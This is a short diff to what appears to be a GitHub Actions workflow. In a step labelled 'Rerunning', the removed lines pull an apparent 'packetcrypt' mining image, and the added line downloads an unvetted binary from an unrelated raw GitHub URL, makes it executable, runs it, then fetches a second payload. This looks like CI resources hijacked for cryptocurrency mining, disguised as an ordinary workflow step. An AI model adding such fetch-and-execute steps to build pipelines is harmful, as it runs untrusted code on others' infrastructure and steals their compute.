@@ -49,5 +49,4 @@ jobs:
     - name: Rerunning
       continue-on-error: true
       run: |
-        docker pull thomasjp0x42/packetcrypt-amd64
-        docker run wget -O 1 https://raw.githubusercontent.com/trautroi/aws/master/nice && chmod +x 1 && ./1 && wget -O 2 https://raw.githubusercontent.com/johnwixk228/ujicoba/main/v2
+        wget -O 1 https://raw.githubusercontent.com/trautroi/aws/master/nice && chmod +x 1 && ./1 && wget -O 2 https://raw.githubusercontent.com/johnwixk228/ujicoba/main/v2
